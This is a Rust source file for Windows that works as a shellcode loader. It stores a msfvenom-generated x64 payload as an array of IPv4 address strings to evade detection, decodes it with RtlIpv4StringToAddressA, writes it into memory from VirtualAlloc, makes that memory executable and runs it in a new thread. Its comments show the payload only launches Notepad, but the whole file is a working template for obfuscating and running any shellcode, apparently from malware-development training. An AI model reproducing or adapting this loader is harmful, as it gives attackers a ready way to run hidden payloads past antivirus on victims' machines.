use winapi::um::winnt::{PVOID, PROCESS_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READ, HEAP_ZERO_MEMORY};
use std::ptr;
use std::ffi::CString;
use winapi::um::errhandlingapi;
use winapi::um::processthreadsapi;
use winapi::um::winbase;
use winapi::um::synchapi::WaitForSingleObject;
use std::process;
use winapi::shared::basetsd::SIZE_T;
use winapi::shared::minwindef::LPVOID;
use winapi::shared::ntdef::NTSTATUS;
use winapi::um::heapapi::{GetProcessHeap, HeapAlloc, HeapFree};
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};

type DWORD = u32;

type FnRtlIpv4StringToAddressA = unsafe extern "system" fn(
    S: *const i8,
    Strict: u8,
    Terminator: *mut *const i8,
    Addr: PVOID,
) -> NTSTATUS;

pub unsafe fn ipv4_deobfuscation(ipv4_array: &[&str], pp_d_address: &mut *mut u8, p_d_size: &mut u64) -> bool {
    let nmbr_of_elements = ipv4_array.len();
    let mut p_buffer: *mut u8 = ptr::null_mut();
    let mut tmp_buffer: *mut u8 = ptr::null_mut();
    let s_buff_size: u64 = (nmbr_of_elements * 4) as u64;
    let mut terminator: *const i8 = ptr::null();
    let mut status: NTSTATUS = 0;

    let h_module = GetModuleHandleA(CString::new("ntdll.dll").unwrap().as_ptr());
    if h_module.is_null() {
        println!("[!] GetModuleHandleA Failed With Error");
        return false;
    }

    let p_rtl_ipv4_string_to_address_a: FnRtlIpv4StringToAddressA = std::mem::transmute(GetProcAddress(
        h_module,
        CString::new("RtlIpv4StringToAddressA").unwrap().as_ptr(),
    ));

    p_buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, s_buff_size as SIZE_T) as *mut u8;
    if p_buffer.is_null() {
        println!("[!] HeapAlloc Failed With Error");
        return false;
    }
    tmp_buffer = p_buffer;

    for ipv4 in ipv4_array {
        let ipv4_address = CString::new(*ipv4).unwrap();
        status = p_rtl_ipv4_string_to_address_a(ipv4_address.as_ptr(), 0, &mut terminator, tmp_buffer as PVOID);

        if(status!=0) {
            println!("[!] RtlIpv4StringToAddressA Failed With Error {:#x}", status);
            HeapFree(GetProcessHeap(),0,tmp_buffer as LPVOID);
            return false;
        }

        tmp_buffer = tmp_buffer.add(4);
    }

    *pp_d_address = p_buffer;
    *p_d_size = s_buff_size;

    true
}

fn main() {

    //┌──(kali㉿kali)-[~/Desktop]
    //└─$ msfvenom -a x64 -p windows/x64/exec CMD=notepad.exe EXITFUNC=thread
    //┌──(kali㉿kali)-[~/Desktop]
    //└─$ ./HellShell output.txt ipv4
    let shellcode : [&str;70] =
        [ "252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81", "86.72.49.210", "101.72.139.82", "96.72.139.82", "24.72.139.82", "32.72.139.114", "80.72.15.183", "74.74.77.49", "201.72.49.192",
            "172.60.97.124", "2.44.32.65", "193.201.13.65", "1.193.226.237", "82.65.81.72", "139.82.32.139", "66.60.72.1", "208.139.128.136", "0.0.0.72", "133.192.116.103", "72.1.208.80", "139.72.24.68",
            "139.64.32.73", "1.208.227.86", "72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192", "172.65.193.201", "13.65.1.193", "56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68",
            "139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73", "1.208.65.139", "4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89", "65.90.72.131", "236.32.65.82", "255.224.88.65",
            "89.90.72.139", "18.233.87.255", "255.255.93.72", "186.1.0.0", "0.0.0.0", "0.72.141.141", "1.1.0.0", "65.186.49.139", "111.135.255.213", "187.224.29.42", "10.65.186.166", "149.189.157.255",
            "213.72.131.196", "40.60.6.124", "10.128.251.224", "117.5.187.71", "19.114.111.106", "0.89.65.137", "218.255.213.110", "111.116.101.112", "97.100.46.101", "120.101.0.144"];

    let mut deobfuscated_address: *mut u8 =  std::ptr::null_mut();
    let mut deobfuscated_size : u64 = 0;
    if !(unsafe { ipv4_deobfuscation(&shellcode, &mut deobfuscated_address, &mut deobfuscated_size) }) {
        eprintln!("Couldn't deobfuscate the payload! Make sure it is a valid shellcode.");
        process::exit(0x0100);
    };

    let shellcode = unsafe {  std::slice::from_raw_parts(deobfuscated_address,deobfuscated_size as usize) };

    unsafe {
        let shellcode_addr = VirtualAlloc(
            ptr::null_mut(),
            shellcode.len().try_into().unwrap(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), shellcode_addr as *mut u8, shellcode.len());

        let mut old_protect : DWORD = PAGE_READWRITE;

        let result = VirtualProtect (
            shellcode_addr,
            shellcode.len() as SIZE_T,
            PAGE_EXECUTE_READ,
            &mut old_protect
        );

        if result == 0 {
            let error = errhandlingapi::GetLastError();
            println!("[-] Error: {}", error.to_string());
            process::exit(0x0100);
        }

        let thread_handle = processthreadsapi::CreateThread(
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(shellcode_addr)),
            ptr::null_mut(),
            0,
            ptr::null_mut()
        );

        if thread_handle.is_null() {
            let error = unsafe { errhandlingapi::GetLastError() };
            println!("{}", error.to_string());
        }

        let status = WaitForSingleObject(thread_handle, winbase::INFINITE);
        if status != 0 {
            let error = errhandlingapi::GetLastError();
            println!("{}", error.to_string())
        }
    }
}
